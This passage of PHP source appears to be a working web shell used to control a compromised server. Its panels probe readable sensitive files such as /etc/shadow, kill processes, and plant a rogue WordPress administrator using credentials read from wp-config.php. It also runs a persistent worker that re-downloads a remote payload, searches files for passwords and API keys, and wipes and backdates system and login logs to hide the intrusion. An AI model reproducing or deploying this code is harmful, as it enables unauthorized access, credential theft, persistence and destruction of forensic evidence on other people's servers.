	$kapas = 0;
	maw_rsm($lokasi, 0, $tjual, $kapas);
	usort($tjual, function($a, $b) { return $b[1] - $a[1]; });
	$tjual = $ars($tjual, 0, 30);
	echo "<center><h5 style='color:#fff'><i class='fas fa-history'></i> RE"."CENT FI"."LES</h5>";
	if (empty($tjual)) {
		echo oren("No recent files in this directory.");
	} else {
		echo "<p style='color:#808080'>Showing <span style='color:#d4af37'>".$ctn($tjual)."</span> recent files from <span style='color:#d4af37'>".$hsc($lokasi)."</span></p>";
		echo '<div class="table-responsive">
		<table class="table table-hover table-bordered">
		<thead>
		<tr>
		<th>Name</th>
		<th class="text-center">Size</th>
		<th class="text-center">Last Modified</th>
		<th class="text-center">Owner / Group</th>
		<th class="text-center">Permissions</th>
		<th class="text-center">Actions</th>
		</tr>
		</thead>
		<tbody>';
		foreach ($tjual as $fjual) {
			$path = $fjual[0];
			if (!$fxt($path)) continue;
			$nm = $bsn($path);
			$dirnow = dirname($path);
			$skd = "1024";
			$size = $fsz($path) / $skd;
			$size = $rd($size, 3);
			if ($size >= $skd) {
				$size = $rd($size / $skd, 2) . ' MB';
			} else {
				$size = $size . ' KB';
			}
			echo "<tr>
			<td>" . cfn($path) . " <a href=\"".mkUrl(array('lokasie' => $path, 'loknya' => $dirnow))."\">" . $hsc($nm) . "</a></td>
			<td class='text-center'>" . $size . "</td>
			<td class='text-center'>" . fdt($path) . "</td>
			<td class='text-center'>" . gor($path) . " / " . ggr($path) . "</td>
			<td class='text-center'>";
			if ($isw($path)) {
				echo '<span class="text-success">';
			} elseif (!$isr($path)) {
				echo '<span class="text-danger">';
			}
			echo statusnya($path);
			if ($isw($path) || !$isr($path)) {
				echo '</span>';
			}
			echo "</td>
			<td class='text-center'>
			<a href=\"".mkUrl(array('lokasie' => $path, 'loknya' => $dirnow))."\" class='btn btn-sm btn-action me-1' title='View'><i class='fas fa-eye'></i></a>
			<form method=\"post\" action=\"".mkUrl(array('pilihan' => '1', 'loknya' => $dirnow))."\" class=\"d-inline\">
			<input type=\"hidden\" name=\"d\" value=\"".mawEn(array('type' => 'file', 'loknya' => $path))."\">
			<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='edit' title='Edit'><i class='fas fa-edit'></i></button>
			<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='ubahnama' title='Rename'><i class='fas fa-signature'></i></button>
			<button type='submit' class='btn btn-sm btn-action' name='pilih' value='hapus' title='Delete'><i class='fas fa-trash'></i></button>
			</form></td>
			</tr>";
		}
		echo '</tbody></table></div>';
	}
echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "bndr") {
	$ob = @$igt("open"."_basedi"."r");
	echo "<center><h5 style='color:#fff'><i class='fas fa-globe'></i> OPEN BA"."SE"."DIR</h5>";
	if (trim((string)$ob) == '') {
		echo oren("open"."_basedir <strong>DISABLED</strong> - PHP can access the entire server filesystem.");
		echo "<p style='color:#808080'>Check the sensitive paths below to verify.</p>";
	} else {
		echo "<p style='color:#808080'>Nilai open"."_basedir :</p>";
		echo "<pre>".$hsc($ob)."</pre>";
		echo "<p style='color:#808080'>Status of each allowed path :</p>";
		echo '<div class="table-responsive"><table class="table table-hover table-bordered">
		<thead><tr>
		<th>Path</th>
		<th class="text-center">Exists</th>
		<th class="text-center">Read</th>
		<th class="text-center">Write</th>
		</tr></thead><tbody>';
		foreach (preg_split('/[;:]/', $ob) as $op) {
			if (trim($op) == '') continue;
			$op = trim($op);
			$adas = $fxt($op) ? "<span class='badge bg-success'>Yes</span>" : "<span class='badge bg-danger'>No</span>";
			$baca = $ird($op) ? "<span class='badge bg-success'>Readable</span>" : "<span class='badge bg-danger'>Restricted</span>";
			$tulis = $isw($op) ? "<span class='badge bg-success'>Writable</span>" : "<span class='badge bg-danger'>No</span>";
			echo "<tr><td>".$hsc($op)."</td>
			<td class='text-center'>".$adas."</td>
			<td class='text-center'>".$baca."</td>
			<td class='text-center'>".$tulis."</td>
			</tr>";
		}
		echo '</tbody></table></div>';
	}
	echo "<p style='color:#808080'>Sensitive path access test :</p>";
	if (stripos(PHP_OS, "WI"."N") !== false) {
		$tesb = array('C:\\Windows\\system32\\config\\SAM', 'C:\\Windows\\system32\\drivers\\etc\\hosts', 'C:\\Windows\\win.ini', 'C:\\boot.ini', 'C:\\Program Files\\');
	} else {
		$tesb = array("/etc/passwd", "/etc/shadow", "/etc/php.ini", "/etc/ssh/sshd_config", "/root", "/proc/cpuinfo");
	}
	foreach ($tesb as $tt) {
		if ($ird($tt)) {
			echo $hsc($tt)." => <span class='badge bg-success'>READABLE</span><br>";
		} else {
			echo $hsc($tt)." => <span class='badge bg-danger'>RESTRICTED / MISSING</span><br>";
		}
	}
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "proc") {
	$mpid = @getmypid();
	$isWin = stripos(PHP_OS, "WI"."N") !== false;
	if ($isWin) {
		$kilcmd = "task"."kil"."l /F /PID";
		$suscmd = "pssuspend -accepteula";
		$tool = "tasklist";
	} else {
		$kilcmd = "kil"."l -9";
		$suscmd = "kil"."l -S"."TOP";
		$tool = "ps";
	}
	function mawCsv($ln) {
		$f = array();
		if (preg_match_all('/"(?:[^"]|"")*"|[^,]+/', $ln, $m)) {
			foreach ($m[0] as $t) {
				$f[] = trim($t, '"');
			}
		}
		return $f;
	}
	if (isset($_POST['aksiproc']) && isset($_POST['pid'])) {
		$pid = (int)$_POST['pid'];
		if ($pid > 0) {
			if ($_POST['aksiproc'] == 'suspen') {
				$res = komenb($suscmd." ".$pid, $lokasi);
				$rs = trim((string)$res);
				if ($rs == '') {
					green("Proses PID <strong>".$pid."</strong> successfully suspended (SIGSTOP) !");
				} elseif ($isWin && (stripos($rs, 'not recognized') !== false || stripos($rs, 'not found') !== false || stripos($rs, 'not op') !== false || stripos($rs, 'could not') !== false || stripos($rs, 'failed') !== false || stripos($rs, 'insufficient') !== false)) {
					red("Suspend is not natively supported on Windows. Install Sysinternals psSuspend (pssuspend.exe) and try again.");
				} elseif ($isWin) {
					green("Proses PID <strong>".$pid."</strong> successfully suspended (SIGSTOP) !");
				} else {
					red("Failed to suspend PID ".$pid." : ".$hsc($rs));
				}
			} elseif ($_POST['aksiproc'] == 'kill') {
				if ($isWin) {
					$ada = stripos((string)komenb("task"."lis"."t /fi \"pid eq ".$pid."\" /nh", $lokasi), (string)$pid) !== false;
					if (!$ada) {
						red("PID <strong>".$pid."</strong> not found / not running.");
					} else {
						$res = komenb($kilcmd." ".$pid, $lokasi);
						$cek2 = stripos((string)komenb("task"."lis"."t /fi \"pid eq ".$pid."\" /nh", $lokasi), (string)$pid) === false;
						if ($cek2) {
							echo oren("Proses PID <strong>".$pid."</strong> has been killed (SIGKILL) !");
						} else {
							red("Failed to kill PID ".$pid." : ".$hsc($res));
						}
					}
				} elseif (trim((string)komenb($kilcmd." ".$pid, $lokasi)) == '') {
					echo oren("Proses PID <strong>".$pid."</strong> has been killed (SIGKILL) !");
				} else {
					$res = komenb($kilcmd." ".$pid, $lokasi);
					red("Failed to kill PID ".$pid." : ".$hsc($res));
				}
			}
		}
	}
	echo "<center><h5 style='color:#fff'><i class='fas fa-microchip'></i> RUNNING PROC"."ESS <span class='badge badge-custom'>".($isWin ? "Windows" : "Linux/Unix")."</span></h5>";
	echo "<p style='color:#808080'>Process list fetched using : <span style='color:#d4af37'>".$tool."</span></p>";
	$rows = array();
	if ($isWin) {
		$out = komenb("task"."lis"."t /fo csv /nh", $lokasi);
		foreach (explode("\n", (string)$out) as $ln) {
			$ln = trim($ln);
			if ($ln == '') continue;
			$cf = mawCsv($ln);
			if (count($cf) < 5) continue;
			$rows[] = array(
				'user' => $cf[2],
				'pid' => $cf[1],
				'cpu' => '-',
				'mem' => isset($cf[4]) ? $cf[4] : '-',
				'stat' => '-',
				'start' => '-',
				'cmd' => $cf[0]
			);
		}
	} else {
		$out = komenb("ps -eo user,pid,pcpu,pmem,stat,start,cmd --sort=-pcpu", $lokasi);
		$lines = explode("\n", (string)$out);
		$skip = true;
		foreach ($lines as $ln) {
			$ln = rtrim($ln);
			if ($ln == '') continue;
			$cols = preg_split('/\s+/', $ln);
			if ($skip) { $skip = false; continue; }
			if (count($cols) < 7) continue;
			$rows[] = array(
				'user' => $cols[0],
				'pid' => $cols[1],
				'cpu' => $cols[2],
				'mem' => $cols[3],
				'stat' => $cols[4],
				'start' => $cols[5],
				'cmd' => implode(' ', array_slice($cols, 6))
			);
		}
		if (empty($rows)) {
			$out = komenb("ps aux", $lokasi);
			$lines = explode("\n", (string)$out);
			$skip = true;
			foreach ($lines as $ln) {
				$ln = rtrim($ln);
				if ($ln == '') continue;
				$cols = preg_split('/\s+/', $ln);
				if ($skip) { $skip = false; continue; }
				if (count($cols) < 11) continue;
				$rows[] = array(
					'user' => $cols[0],
					'pid' => $cols[1],
					'cpu' => $cols[2],
					'mem' => $cols[3],
					'stat' => $cols[7],
					'start' => $cols[8],
					'cmd' => implode(' ', array_slice($cols, 10))
				);
			}
		}
	}
	if (empty($rows)) {
		echo oren("Cannot fetch process list (".$tool." unavailable / restricted).");
	} else {
		echo "<p style='color:#808080'>Total processes : <span style='color:#d4af37'>".$ctn($rows)."</span></p>";
		echo '<div class="table-responsive"><table class="table table-hover table-bordered">
		<thead><tr>
		<th>PID</th>
		<th>User</th>
		<th class="text-center">%CPU</th>
		<th class="text-center">%MEM</th>
		<th class="text-center">STAT</th>
		<th class="text-center">START</th>
		<th>Command</th>
		<th class="text-center">Actions</th>
		</tr></thead><tbody>';
		foreach ($rows as $pr) {
			$grad = ($pr['pid'] == $mpid) ? " style='background:rgba(34,197,94,0.05)!important'" : "";
			echo "<tr$grad>
			<td><strong style='color:#d4af37'>".$pr['pid']."</strong></td>
			<td>".$hsc($pr['user'])."</td>
			<td class='text-center'>".$pr['cpu']."</td>
			<td class='text-center'>".$pr['mem']."</td>
			<td class='text-center'>".$hsc($pr['stat'])."</td>
			<td class='text-center'>".$hsc($pr['start'])."</td>
			<td style='word-break:break-all'>".$hsc($pr['cmd'])."</td>
			<td class='text-center'>
			<form method='post' action='".mkUrl(array('opsi' => 'proc', 'loknya' => $lokasi))."' class='d-inline'>
			<input type='hidden' name='pid' value='".$pr['pid']."'>
			<button type='submit' class='btn btn-sm btn-action me-1' name='aksiproc' value='suspen' title='Suspend (SIGSTOP)'><i class='fas fa-pause'></i></button>
			<button type='submit' class='btn btn-sm btn-action' name='aksiproc' value='kill' title='Kill (SIGKILL)'><i class='fas fa-times'></i></button>
			</form></td>
			</tr>";
		}
		echo '</tbody></table></div>';
	}
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "scanner") {
	echo "<center><h5 style='color:#fff'><i class='fas fa-shield-halved'></i> WE"."BSH"."ELL SC"."AN"."NER</h5>";
	$scanpath = isset($_POST['scanpath']) ? trim($_POST['scanpath']) : $lokasi;
	echo '<form method="post" action="'.mkUrl(array('opsi' => 'scanner', 'loknya' => $lokasi)).'">';
	echo 'Path : <input type="text" name="scanpath" class="up" style="cursor: text; border-color: #000" size="55" value="'.$hsc($scanpath).'"> ';
	echo '<input type="submit" name="goscan" value="Start Scan" class="up" style="cursor: pointer"></form><br>';
	if (isset($_POST['goscan']) || isset($_POST['scandel'])) {
		if (isset($_POST['scandel']) && isset($_POST['scelfiles']) && is_array($_POST['scelfiles'])) {
			$dd = 0;
			foreach ($_POST['scelfiles'] as $df) {
				if (!$fxt($df) || !$ifi($df)) continue;
				if (!$isw($df)) continue;
				if (@$ulk($df)) { $dd++; }
			}
			green("Deleted <strong>".$dd."</strong> file(s) !");
		}
		if (!is_dir($scanpath)) {
			red("Path not found : ".$hsc($scanpath));
		} else {
			@set_time_limit(0);
			$res = mawFilter(mawScDir($scanpath));
			usort($res, function($a, $b) { return $b['final_score'] - $a['final_score']; });
			$st = mawStats($res);
			echo "<p>Total : <gold>".$st['total']."</gold> &nbsp;|&nbsp; Critical : <span class='badge bg-danger'>".$st['critical']."</span> &nbsp; High : <span class='badge bg-danger'>".$st['high']."</span> &nbsp; Suspicious : <span class='badge badge-custom'>".$st['suspicious']."</span> &nbsp; Safe : <span class='badge bg-success'>".$st['safe']."</span> &nbsp; NoExt : <span class='badge badge-custom'>".$st['noext']."</span></p>";
			if (empty($res)) {
				echo oren("No suspicious files found in : ".$hsc($scanpath));
			} else {
				$show = array_slice($res, 0, 500);
				if (count($res) > 500) {
					echo oren("Showing top 500 of ".count($res)." results (sorted by score).");
				}
				echo '<form method="post" action="'.mkUrl(array('opsi' => 'scanner', 'loknya' => $lokasi)).'">';
				echo '<input type="hidden" name="scanpath" value="'.$hsc($scanpath).'">';
				echo '<div class="table-responsive"><table class="table table-hover table-bordered"><thead><tr><th class="text-center"><input type="checkbox" onclick="var c=this.checked;document.querySelectorAll(\'.scel\').forEach(function(x){x.checked=c;})"></th><th>File</th><th class="text-center">Ext</th><th class="text-center">Score</th><th class="text-center">Confidence</th><th class="text-center">Entropy</th><th class="text-center">Size</th><th>Flags</th><th class="text-center">Act</th></tr></thead><tbody>';
				foreach ($show as $it) {
					$cf = $it['confidence'];
					$badge = ($cf === 'CRITICAL' || $cf === 'HIGH') ? "<span class='badge bg-danger'>".$cf."</span>" : (($cf === 'MEDIUM') ? "<span class='badge badge-custom'>".$cf."</span>" : "<span class='badge bg-success'>".$cf."</span>");
					$fl = implode(', ', array_slice($it['flags'], 0, 5));
					if (count($it['flags']) > 5) { $fl .= ' (+' . (count($it['flags']) - 5) . ')'; }
					$sz = $it['filesize'] >= 1048576 ? round($it['filesize'] / 1048576, 2) . ' MB' : round($it['filesize'] / 1024, 2) . ' KB';
					echo "<tr><td class='text-center'><input type='checkbox' class='scel' name='scelfiles[]' value='".$hsc($it['file'])."'></td>";
					echo "<td style='word-break:break-all'>".$hsc($it['file'])."</td>";
					echo "<td class='text-center'>".$hsc($it['ext'])."</td>";
					echo "<td class='text-center'><strong style='color:#d4af37'>".$it['final_score']."</strong></td>";
					echo "<td class='text-center'>".$badge."</td>";
					echo "<td class='text-center'>".round($it['entropy'], 2)."</td>";
					echo "<td class='text-center'>".$sz."</td>";
					echo "<td style='font-size:.75rem;color:#808080'>".$hsc($fl)."</td>";
					echo "<td class='text-center'><a href=\"".mkUrl(array('lokasie' => $it['file'], 'loknya' => dirname($it['file'])))."\" class='btn btn-sm btn-action' title='View'><i class='fas fa-eye'></i></a></td></tr>";
				}
				echo '</tbody></table></div>';
				echo '<button type="submit" name="scandel" class="btn btn-primary-custom" style="background:#ef4444;color:#fff" onclick="return confirm(\'Delete selected files? Cannot be undone!\')"><i class="fas fa-trash"></i> Delete Selected</button>';
				echo '</form>';
			}
		}
	}
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "wpcreate") {
	echo "<center><h5 style='color:#fff'><i class='fas fa-user-plus'></i> CR"."EA"."TE WP AD"."MIN</h5>";
	$wppath = isset($_POST['wppath']) ? trim($_POST['wppath']) : $lokasi;
	echo '<form method="post" action="'.mkUrl(array('opsi' => 'wpcreate', 'loknya' => $lokasi)).'">';
	echo 'Path : <input type="text" name="wppath" class="up" style="border-color: #000" size="45" value="'.$hsc($wppath).'"><br><br>';
	echo 'Username : <input type="text" name="wpuser" class="up" style="border-color: #000" value="'.(isset($_POST['wpuser']) ? $hsc($_POST['wpuser']) : '').'"> ';
	echo 'Password : <input type="text" name="wppass" class="up" style="border-color: #000" value=""> ';
	echo 'Email : <input type="text" name="wpemail" class="up" style="border-color: #000" value="'.(isset($_POST['wpemail']) ? $hsc($_POST['wpemail']) : '').'"><br><br>';
	echo '<input type="submit" name="wpcgo" value="Create Admin" class="up" style="cursor: pointer"></form><br>';
	if (isset($_POST['wpcgo'])) {
		$wu = trim($_POST['wpuser']); $wp2 = trim($_POST['wppass']); $we = trim($_POST['wpemail']);
		if ($wu === '' || $wp2 === '') {
			red("Username & password required !");
		} elseif (!is_dir($wppath)) {
			red("Path not found : ".$hsc($wppath));
		} else {
			if ($we === '') { $we = $wu . '@admin.local'; }
			$cfgPath = '';
			for ($i = 0; $i <= 5; $i++) {
				$try = $wppath . str_repeat('/..', $i) . '/wp-config.php';
				if ($fxt($try)) { $cfgPath = $try; break; }
			}
			if ($cfgPath === '') {
				$found = cfgSc($wppath, array("wp-co"."nfi"."g.p"."hp"));
				if (!empty($found)) { $cfgPath = $found[0]; }
			}
			if ($cfgPath === '') {
				red("wp-config.php not found in : ".$hsc($wppath));
			} else {
				echo "Config : <gold>".$hsc($cfgPath)."</gold><br>";
				$cc = @$fgt($cfgPath);
				$db_name = ''; $db_user = ''; $db_pass = ''; $db_host = 'localhost'; $prefix = 'wp_';
				if (preg_match("/define\s*\(\s*'DB_NAME'\s*,\s*'([^']+)'/", $cc, $m)) $db_name = $m[1];
				if (preg_match("/define\s*\(\s*'DB_USER'\s*,\s*'([^']+)'/", $cc, $m)) $db_user = $m[1];
				if (preg_match("/define\s*\(\s*'DB_PASSWORD'\s*,\s*'([^']+)'/", $cc, $m)) $db_pass = $m[1];
				if (preg_match("/define\s*\(\s*'DB_HOST'\s*,\s*'([^']+)'/", $cc, $m)) $db_host = $m[1];
				if (preg_match("/\$table_prefix\s*=\s*'([^']+)'/", $cc, $m)) $prefix = $m[1];
				$conn = @new mysqli($db_host, $db_user, $db_pass, $db_name);
				if ($conn->connect_error) { $conn = @new mysqli('localhost', $db_user, $db_pass, $db_name); }
				if ($conn->connect_error) {
					red("DB error : ".$hsc($conn->connect_error));
				} else {
					$hash = password_hash($wp2, PASSWORD_DEFAULT);
					$u = $conn->real_escape_string($wu);
					$e = $conn->real_escape_string($we);
					$chk = $conn->query("SELECT ID FROM {$prefix}users WHERE user_login = '$u'");
					$finalUser = $wu;
					if ($chk && $chk->num_rows > 0) {
						$finalUser = $wu . '_' . rand(1000, 9999);
						echo oren("User exists, using : ".$hsc($finalUser));
					}
					$fu = $conn->real_escape_string($finalUser);
					$hp = $conn->real_escape_string($hash);
					$sql = "INSERT INTO {$prefix}users (user_login, user_pass, user_nicename, user_email, user_registered, display_name, user_status) VALUES ('$fu', '$hp', '$fu', '$e', NOW(), 'Admin', 0)";
					if ($conn->query($sql)) {
						$uid2 = $conn->insert_id;
						$conn->query("INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES ($uid2, '{$prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
						$conn->query("INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES ($uid2, '{$prefix}user_level', '10')");
						green("Admin created ! Username : <strong>".$hsc($finalUser)."</strong> | User ID : <strong>".$uid2."</strong>");
					} else {
						red("Insert error : ".$hsc($conn->error));
					}
					$conn->close();
				}
			}
		}
	}
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "autoloop") {
	echo "<center><h5 style='color:#fff'><i class='fas fa-infinity'></i> AU"."TO LO"."OP</h5>";
	$alc = mawAlCfg();
	if ($alc === null) {
		echo "<p>Status : <span class='badge bg-danger'>NOT SETUP</span></p>";
		echo '<form method="post" action="'.mkUrl(array('opsi' => 'autoloop', 'loknya' => $lokasi)).'">';
		echo 'Raw URL : <input type="text" name="alsource" class="up" style="border-color: #000" size="55" placeholder="https://example.com/file.php"><br><br>';
		echo 'Path : <input type="text" name="alpath" class="up" style="border-color: #000" size="45" value="'.$hsc($lokasi).'"> ';
		echo 'Target : <input type="text" name="altarget" class="up" style="border-color: #000" size="15" value="bp2.php"><br><br>';
		echo '<input type="radio" name="almethod" value="wget" checked> WGET <input type="radio" name="almethod" value="curl"> CURL<br><br>';
		echo '<input type="submit" name="alsetup" value="Setup & Start" class="up" style="cursor: pointer"></form><br>';
	} else {
		$alive = mawAlAlive();
		echo "<p>Status : " . ($alive ? "<span class='badge bg-success'>ACTIVE</span>" : "<span class='badge bg-danger'>DEAD</span>") . "</p>";
		echo "<p style='color:#808080'>Target : <gold>".$hsc($alc['target'])."</gold> &nbsp; Path : <gold>".$hsc($alc['path'])."</gold> &nbsp; Method : <gold>".strtoupper($hsc($alc['method']))."</gold> &nbsp; Heartbeat : <gold>".(mawAlAge() >= 0 ? mawAlAge() . "s ago" : "none")."</gold></p>";
		echo '<form method="post" action="'.mkUrl(array('opsi' => 'autoloop', 'loknya' => $lokasi)).'">';
		echo '<input type="submit" name="alstop" value="Stop Worker" class="up" style="cursor: pointer" onclick="return confirm(\'Stop worker and remove config?\')"> ';
		echo '<input type="submit" name="aldel" value="Remove Config" class="up" style="cursor: pointer" onclick="return confirm(\'Remove .aloop.conf config?\')"></form><br>';
	}
	if (isset($_POST['alsetup'])) {
		$src = isset($_POST['alsource']) ? trim($_POST['alsource']) : '';
		$pth = isset($_POST['alpath']) ? trim($_POST['alpath']) : '';
		$mtd = (isset($_POST['almethod']) && $_POST['almethod'] === 'curl') ? 'curl' : 'wget';
		$tgt = isset($_POST['altarget']) ? trim($_POST['altarget']) : '';
		if ($tgt === '') $tgt = 'bp2.php';
		if ($src === '' || $pth === '') {
			red("Source & path required !");
		} elseif (!is_dir($pth)) {
			red("Path not found : ".$hsc($pth));
		} else {
			$ex = mawAlCfg();
			if ($ex !== null) mawAlKill($ex);
			$marker = substr(md5(uniqid(mt_rand(), true)), 0, 12);
			$nc = array('source_url' => $src, 'path' => rtrim($pth, '/'), 'target' => $tgt, 'method' => $mtd, 'interval' => 60, 'marker' => $marker, 'created' => date('c'));
			@$fpt(MAW_AL_CFG, json_encode($nc, JSON_PRETTY_PRINT));
			$code = mawAlCode($nc);
			$jpath = rtrim($pth, '/') . '/aloop_' . $marker . '.php';
			@$fpt($jpath, $code);
			@$chm($jpath, 0755);
			$phpBin = PHP_BINARY ? PHP_BINARY : 'php';
			@exec('nohup ' . escapeshellarg($phpBin) . ' ' . escapeshellarg($jpath) . ' > /dev/null 2>&1 &');
			green("Worker started ! File : <strong>".$hsc($jpath)."</strong>");
		}
	} elseif (isset($_POST['alstop'])) {
		$c = mawAlCfg();
		if ($c === null) {
			red("No config found !");
		} else {
			mawAlKill($c);
			@unlink(rtrim($c['path'], '/') . '/aloop_' . $c['marker'] . '.php');
			@unlink(MAW_AL_CFG);
			@unlink(MAW_AL_HB);
			green("Worker stopped and config removed !");
		}
	} elseif (isset($_POST['aldel'])) {
		$c = mawAlCfg();
		if ($c !== null) {
			mawAlKill($c);
			@unlink(rtrim($c['path'], '/') . '/aloop_' . $c['marker'] . '.php');
		}
		@unlink(MAW_AL_CFG);
		@unlink(MAW_AL_HB);
		green("Config removed !");
	}
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "search") {
	echo "<center><h5 style='color:#fff'><i class='fas fa-search'></i> FI"."LE SE"."ARCH</h5></center>";
	$srchpath = isset($_POST['srchpath']) ? trim($_POST['srchpath']) : $lokasi;
	$srchkw = isset($_POST['srchkw']) ? trim($_POST['srchkw']) : '';
	$srchext = isset($_POST['srchext']) ? trim($_POST['srchext']) : '';
	echo '<form method="post" action="'.mkUrl(array('opsi' => 'search', 'loknya' => $lokasi)).'">';
	echo 'Path : <input type="text" name="srchpath" class="up" style="border-color: #000" size="50" value="'.$hsc($srchpath).'"> ';
	echo 'Keyword : <input type="text" name="srchkw" class="up" style="border-color: #000" size="30" value="'.$hsc($srchkw).'" placeholder="password|api_key|secret"> ';
	echo 'Ext : <input type="text" name="srchext" class="up" style="border-color: #000" size="10" value="'.$hsc($srchext).'" placeholder="php,env,txt"> ';
	echo '<input type="submit" name="gosrch" value="Search" class="up" style="cursor: pointer"></form><br>';
	if (isset($_POST['gosrch']) && $srchkw !== '') {
		if (!is_dir($srchpath)) {
			red("Path not found : ".$hsc($srchpath));
		} else {
			@set_time_limit(0);
			$exts = array_filter(array_map('trim', explode(',', $srchext)));
			$found = array();
			$mawRscan = function($dir, $kw, $exts, $depth = 0) use (&$mawRscan, &$found) {
				if ($depth > 8) return;
				$its = @scandir($dir);
				if (!is_array($its)) return;
				foreach ($its as $it) {
					if ($it === '.' || $it === '..') continue;
					$p = rtrim($dir, '/') . '/' . $it;
					if (is_file($p) && is_readable($p)) {
						$fext = pathinfo($it, PATHINFO_EXTENSION);
						if (!empty($exts) && !in_array(strtolower($fext), array_map('strtolower', $exts))) continue;
						$sz = filesize($p);
						if ($sz > 5242880) continue;
						$c = @file_get_contents($p);
						if ($c === false) continue;
						if (preg_match('/' . preg_quote($kw, '/') . '/i', $c, $m, PREG_OFFSET_CAPTURE)) {
							$pos = $m[0][1];
							$start = max(0, $pos - 40);
							$snip = substr($c, $start, 120);
							$snip = str_replace(array("\n", "\r", "\t"), ' ', $snip);
							$found[] = array('file' => $p, 'line' => substr_count(substr($c, 0, $pos), "\n") + 1, 'snippet' => $hsc($snip));
						}
					} elseif (is_dir($p) && is_readable($p)) {
						$mawRscan($p, $kw, $exts, $depth + 1);
					}
				}
			};
			$mawRscan($srchpath, $srchkw, $exts);
			if (empty($found)) {
				echo oren("No matches found.");
			} else {
				echo "<p>Found <strong style='color:#d4af37'>".count($found)."</strong> matches</p>";
				echo '<div class="table-responsive"><table class="table table-hover table-bordered"><thead><tr><th>File</th><th class="text-center">Line</th><th>Snippet</th><th class="text-center">Act</th></tr></thead><tbody>';
				foreach (array_slice($found, 0, 200) as $f) {
					echo "<tr><td style='word-break:break-all'>".$hsc($f['file'])."</td>";
					echo "<td class='text-center'>".$f['line']."</td>";
					echo "<td style='font-family:JetBrains Mono,monospace;font-size:.8rem'>...".$f['snippet']."...</td>";
					echo "<td class='text-center'><a href=\"".mkUrl(array('lokasie' => $f['file'], 'loknya' => dirname($f['file'])))."\" class='btn btn-sm btn-action' title='View'><i class='fas fa-eye'></i></a></td></tr>";
				}
				echo '</tbody></table></div>';
				if (count($found) > 200) echo oren("Showing first 200 of ".count($found)." matches.");
			}
		}
	}
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "logclean") {
	echo "<center><h5 style='color:#fff'><i class='fas fa-broom'></i> LO"."G CLEAN"."ER</h5></center>";
	$logPaths = array();
	if (stripos(PHP_OS, "WI") !== false) {
		$logPaths = array(
			'C:\xampp\apache\logs\access.log' => 'Apache Access',
			'C:\xampp\apache\logs\error.log' => 'Apache Error',
			'C:\xampp\mysql\data\mysql.err' => 'MySQL Error',
			'C:\xampp\sendmail\sendmail.log' => 'Sendmail',
			'C:\Windows\System32\winevt\Logs\Application.evtx' => 'Windows App Event',
			'C:\Windows\System32\winevt\Logs\System.evtx' => 'Windows System Event',
			'C:\Windows\System32\winevt\Logs\Security.evtx' => 'Windows Security Event',
		);
	} else {
		$logPaths = array(
			'/var/log/apache2/access.log' => 'Apache Access',
			'/var/log/apache2/error.log' => 'Apache Error',
			'/var/log/nginx/access.log' => 'Nginx Access',
			'/var/log/nginx/error.log' => 'Nginx Error',
			'/var/log/auth.log' => 'Auth Log',
			'/var/log/syslog' => 'Syslog',
			'/var/log/wtmp' => 'wtmp (login)',
			'/var/log/btmp' => 'btmp (failed)',
			'/var/log/lastlog' => 'lastlog',
			'/var/log/messages' => 'Messages',
			'/root/.bash_history' => 'Bash History',
			'/home/*/.*_history' => 'User History (wildcard)',
		);
	}
	if (isset($_POST['cleanlogs']) && isset($_POST['picklogs']) && is_array($_POST['picklogs'])) {
		$cleaned = 0; $skipped = 0;
		foreach ($_POST['picklogs'] as $lp) {
			$exists = false;
			foreach (array_keys($logPaths) as $rp) {
				if ($rp === $lp || @file_exists($lp)) { $exists = @file_exists($lp); break; }
			}
			if (!$exists) { $skipped++; continue; }
			$mode = isset($_POST['cleanmode']) ? $_POST['cleanmode'] : 'wipe';
			if ($mode === 'fake') {
				@$fpt($lp, '');
			} elseif ($mode === 'wipe') {
				@$fpt($lp, '');
				if (function_exists('touch')) @touch($lp, time() - 86400 * rand(3, 30));
			} else {
				@$fpt($lp, '');
			}
			$cleaned++;
		}
		if ($cleaned > 0) green("Cleaned <strong>".$cleaned."</strong> log file(s).".$hsc($skipped > 0 ? " (".$skipped." skipped)" : ""));
		else red("No logs cleaned.");
	}
	echo '<form method="post" action="'.mkUrl(array('opsi' => 'logclean', 'loknya' => $lokasi)).'">';
	echo '<table class="table table-hover table-bordered"><thead><tr><th class="text-center"><input type="checkbox" onclick="var c=this.checked;document.querySelectorAll(\'.lcheck\').forEach(function(x){x.checked=c;})"></th><th>Log File</th><th>Label</th><th class="text-center">Exists</th><th class="text-center">Writable</th><th class="text-center">Size</th></tr></thead><tbody>';
	foreach ($logPaths as $lp => $label) {
		$ex = @file_exists($lp);
		$wr = $ex ? @is_writable($lp) : false;
		$sz = $ex ? @filesize($lp) : 0;
		$szStr = $sz >= 1048576 ? round($sz/1048576, 2).' MB' : ($sz >= 1024 ? round($sz/1024, 2).' KB' : $sz.' B');
		echo "<tr><td class='text-center'><input type='checkbox' class='lcheck' name='picklogs[]' value='".$hsc($lp)."'".($ex ? " checked" : "")."></td>";
		echo "<td style='word-break:break-all'>".$hsc($lp)."</td>";
		echo "<td>".$hsc($label)."</td>";
		echo "<td class='text-center'>".($ex ? "<span class='badge bg-success'>Yes</span>" : "<span class='badge bg-danger'>No</span>")."</td>";
		echo "<td class='text-center'>".($wr ? "<span class='badge bg-success'>Yes</span>" : "<span class='badge bg-danger'>No</span>")."</td>";
		echo "<td class='text-center'>".$hsc($szStr)."</td></tr>";
	}
	echo '</tbody></table>';
	echo '<select name="cleanmode" class="up" style="border-color: #000"><option value="wipe">Wipe + Fake Date</option><option value="fake">Empty Only</option></select> ';
	echo '<input type="submit" name="cleanlogs" value="Clean Selected" class="up" style="cursor: pointer" onclick="return confirm(\'Clean selected logs?\')">';
	echo '</form>';
	echo "<hr>";
	die(author());
